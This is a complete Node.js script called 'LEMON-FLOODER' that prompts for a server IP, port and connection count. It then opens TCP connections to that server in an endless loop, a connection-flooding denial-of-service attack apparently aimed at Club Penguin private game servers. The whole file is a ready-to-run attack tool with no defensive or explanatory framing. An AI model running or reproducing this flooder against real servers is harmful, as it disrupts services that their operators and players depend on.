const c = require('chalk');
const net = require('net');
const prompt = require('prompt-sync')({ sigint: true });

let connections = 0;
let connectionLimit;

(async () => {
    console.log(c.yellow(`    ██╗     ███████╗███╗   ███╗ ██████╗ ███╗   ██╗      ███████╗██╗      ██████╗  ██████╗ ██████╗ ███████╗██████╗ \n    ██║     ██╔════╝████╗ ████║██╔═══██╗████╗  ██║      ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗\n    ██║     █████╗  ██╔████╔██║██║   ██║██╔██╗ ██║█████╗█████╗  ██║     ██║   ██║██║   ██║██║  ██║█████╗  ██████╔╝\n    ██║     ██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════╝██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██╗\n    ███████╗███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║      ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝███████╗██║  ██║\n    ╚══════╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\n                                              created by benji#1337`));

    const ip_address = prompt(c.cyan('Server IP Address: '));  // start prompt data collection
    if (ip_address.length === 0) return console.log(c.redBright('[ERROR] Please enter the server\'s IP Address. Can be found @ play.cpps.com/servers.xml or the source of the play page! (use braincells pls)'));

    const port = prompt(c.cyan('Port: '));
    if (port.length === 0) return console.log(c.redBright('[ERROR] Please enter a port, normally 6112.'));

    connectionLimit = prompt(c.cyan('Connections: '));
    if (connectionLimit.length === 0) return console.log(c.redBright('[ERROR] Input how many connections you want to flood.'));

    while (true) await floodConnection(ip_address, port);
})();

async function floodConnection(ip, port) {
    return new Promise((resolve) => {
        let socket = new net.Socket();
        socket.connect({ port: port, host: ip }, () => {
            connections++;
            console.log(c.greenBright(`[SUCCESS] Created ${connections} connection(s) to ${ip}:${port}!`));
            if(connections == connectionLimit) return console.log(c.magentaBright(`Successfully created all ${connectionLimit} connections!`));
            resolve();
        })
        socket.on('error', (err) => {
            return console.log(c.redBright(`[ERROR] There was an error connecting to ${ip} on port ${port}: ${err.toString().replace('Error: ', "")}`));
        });
    });
};
